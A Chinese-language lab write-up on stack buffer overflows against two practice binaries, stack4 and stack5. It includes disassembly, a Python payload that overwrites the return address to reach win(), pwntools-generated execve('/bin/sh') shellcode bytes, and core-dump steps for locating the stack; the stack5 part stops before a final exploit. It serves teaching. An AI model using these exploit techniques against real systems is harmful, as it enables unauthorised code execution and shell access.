# <center>栈溢出实验3</center>

## 实验概述

### 【目的】
1. 运行stack4，获得输出`code flow successfully changed`
2. 运行stack5，反弹得到shell
### 【环境】
Linux
### 【工具】
python
### 【原理】
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
## 实验步骤

### 【步骤】
#### stack4
```
$ binwalk stack4

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)
```
```
char *pwnthis()
{
  char s; // [sp+0h] [bp-48h]@1

  return gets(&s);
}
```
```
int win()
{
  return puts("code flow successfully changed");
}
```
```
.text:08048454 ; =============== S U B R O U T I N E =======================================
.text:08048454
.text:08048454 ; Attributes: bp-based frame
.text:08048454
.text:08048454                 public pwnthis
.text:08048454 pwnthis         proc near               ; CODE XREF: main+11p
.text:08048454
.text:08048454 s               = byte ptr -48h
.text:08048454
.text:08048454                 push    ebp
.text:08048455                 mov     ebp, esp
.text:08048457                 sub     esp, 48h
.text:0804845A                 sub     esp, 0Ch
.text:0804845D                 lea     eax, [ebp+s]
.text:08048460                 push    eax             ; s
.text:08048461                 call    _gets
.text:08048466                 add     esp, 10h
.text:08048469                 nop
.text:0804846A                 leave
.text:0804846B                 retn
.text:0804846B pwnthis         endp
```
`pwnthis()`函数中有且仅有一个危险函数`gets(&s);`,目标仍然是跳转到函数`win()`上获得输出`code flow successfully changed`。

在IDA pro中双击 `char s`查看栈的结构

```
-00000048 s               db ?
-00000047                 db ? ; undefined
-00000046                 db ? ; undefined
-00000045                 db ? ; undefined
-00000044                 db ? ; undefined
-00000043                 db ? ; undefined
-00000042                 db ? ; undefined
-00000041                 db ? ; undefined
-00000040                 db ? ; undefined
-0000003F                 db ? ; undefined
-0000003E                 db ? ; undefined
-0000003D                 db ? ; undefined
-0000003C                 db ? ; undefined
-0000003B                 db ? ; undefined
-0000003A                 db ? ; undefined
-00000039                 db ? ; undefined
-00000038                 db ? ; undefined
-00000037                 db ? ; undefined
-00000036                 db ? ; undefined
-00000035                 db ? ; undefined
-00000034                 db ? ; undefined
-00000033                 db ? ; undefined
-00000032                 db ? ; undefined
-00000031                 db ? ; undefined
-00000030                 db ? ; undefined
-0000002F                 db ? ; undefined
-0000002E                 db ? ; undefined
-0000002D                 db ? ; undefined
-0000002C                 db ? ; undefined
-0000002B                 db ? ; undefined
-0000002A                 db ? ; undefined
-00000029                 db ? ; undefined
-00000028                 db ? ; undefined
-00000027                 db ? ; undefined
-00000026                 db ? ; undefined
-00000025                 db ? ; undefined
-00000024                 db ? ; undefined
-00000023                 db ? ; undefined
-00000022                 db ? ; undefined
-00000021                 db ? ; undefined
-00000020                 db ? ; undefined
-0000001F                 db ? ; undefined
-0000001E                 db ? ; undefined
-0000001D                 db ? ; undefined
-0000001C                 db ? ; undefined
-0000001B                 db ? ; undefined
-0000001A                 db ? ; undefined
-00000019                 db ? ; undefined
-00000018                 db ? ; undefined
-00000017                 db ? ; undefined
-00000016                 db ? ; undefined
-00000015                 db ? ; undefined
-00000014                 db ? ; undefined
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011                 db ? ; undefined
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C                 db ? ; undefined
-0000000B                 db ? ; undefined
-0000000A                 db ? ; undefined
-00000009                 db ? ; undefined
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

其中 48处的s是指字符数组s，00处的s指保存在栈上的寄存器，r指的是返回地址，我们的目标就是覆盖返回地址，使函数在执行ret指令时，将我们覆盖的返回地址的值pop弹出到eip，从而改变程序的执行流。
```
$ python -c "print 'a'*(0x48+4) + '\x3b\x84\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault (core dumped)

```

#### stack5
用gdb打开。
```
$ gdb stack5
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from stack5...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048423 <+0>:	lea    ecx,[esp+0x4]
   0x08048427 <+4>:	and    esp,0xfffffff0
   0x0804842a <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804842d <+10>:	push   ebp
   0x0804842e <+11>:	mov    ebp,esp
   0x08048430 <+13>:	push   ecx
   0x08048431 <+14>:	sub    esp,0x4
   0x08048434 <+17>:	call   0x804840b <pwnthis>
   0x08048439 <+22>:	mov    eax,0x0
   0x0804843e <+27>:	add    esp,0x4
   0x08048441 <+30>:	pop    ecx
   0x08048442 <+31>:	pop    ebp
   0x08048443 <+32>:	lea    esp,[ecx-0x4]
   0x08048446 <+35>:	ret    
End of assembler dump.
gdb-peda$ disass pwnthis
Dump of assembler code for function pwnthis:
   0x0804840b <+0>:	push   ebp
   0x0804840c <+1>:	mov    ebp,esp
   0x0804840e <+3>:	sub    esp,0x48
   0x08048411 <+6>:	sub    esp,0xc
   0x08048414 <+9>:	lea    eax,[ebp-0x48]
   0x08048417 <+12>:	push   eax
   0x08048418 <+13>:	call   0x80482e0 <gets@plt>
   0x0804841d <+18>:	add    esp,0x10
   0x08048420 <+21>:	nop
   0x08048421 <+22>:	leave  
   0x08048422 <+23>:	ret    
End of assembler dump.

```
容易发现stack5跟stack4结构差不多，只是少了`win()`函数，但是这里的目标是反弹shell，所以`win()`并不关键。
要反弹shell，用c语言描述，我们需要运行代码 `excve("/bin/sh")`

利用pwntools，我们可以拿到 `excve("/bin/sh")`的汇编代码。
```
$ python 
Python 2.7.12 (default, Nov 20 2017, 18:23:56) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> print shellcraft.i386.sh()
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

>>> asm(shellcraft.i386.sh())  
'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'


```
当然对于二进制程序来说，汇编代码也不是能直接运行的，这里用pwntools的`asm()`把汇编编译成机器码。
这里的思路是把shellcode写到栈上，再通过覆盖ret地址将程序执行流劫持到shellcode所在的位置，这样就能运行shellcode，反弹shell。
```
     --------------------------
     |                          |
     |                          |
[shellcode]["aaaaaaaaaaa"....][ret]
```
问题是如何得到shellcode的地址呢，也就是说如何得到当前栈的地址,这里可以使用core dump来查找。
首先开启core dump的记录功能。
```
ulimit -c unlimited
sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
```
再次触发溢出，并通过gdb查看core文件。
```
$ python -c "print 'A'*200" | ./stack5
Segmentation fault (core dumped)
$ gdb stack5 /tmp/core.1522317467
Core was generated by `./stack5'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
gdb-peda$ x/10s $esp-100
0xffffcf0c:	"\035\204\004\b \317\377\377\030\331\377\367\060\317\377\377;\202\004\b", 'A' <repeats 180 times>...
0xffffcfd4:	'A' <repeats 20 times>
0xffffcfe9:	"\230\376", <incomplete sequence \367>
0xffffcfed:	"\320\377\367\001"
0xffffcff2:	""
0xffffcff3:	""
0xffffcff4:	"\020\203\004\b"
0xffffcff9:	""
0xffffcffa:	""
0xffffcffb:	""

```
### 【总结】
